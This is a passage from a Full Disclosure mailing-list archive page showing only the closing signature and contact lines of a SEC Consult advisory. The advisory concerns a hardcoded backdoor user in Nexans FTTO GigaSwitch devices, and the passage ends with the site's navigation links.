~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Interested to work with the experts of SEC Consult?
Send us your application <https://sec-consult.com/career/>

Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices <https://sec-consult.com/contact/>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Mail: security-research at sec-consult dot com
Web: <https://www.sec-consult.com>
Blog: <http://blog.sec-consult.com>
Twitter: <https://twitter.com/sec_consult>

EOF T. Weber / @2022
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>
```

---

[![Previous](/images/left-icon-16x16.png)](35)
[By Date](date.html#36)
[![Next](/images/right-icon-16x16.png)](37)

[![Previous](/images/left-icon-16x16.png)](35)
[By Thread](index.html#36)
[![Next](/images/right-icon-16x16.png)](37)

### Current thread:

* **SEC Consult SA-20220615-0 :: Hardcoded Backdoor User and Outdated Software Components in Nexans FTTO GigaSwitch series** *SEC Consult Vulnerability Lab, Research via Fulldisclosure (Jun 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")


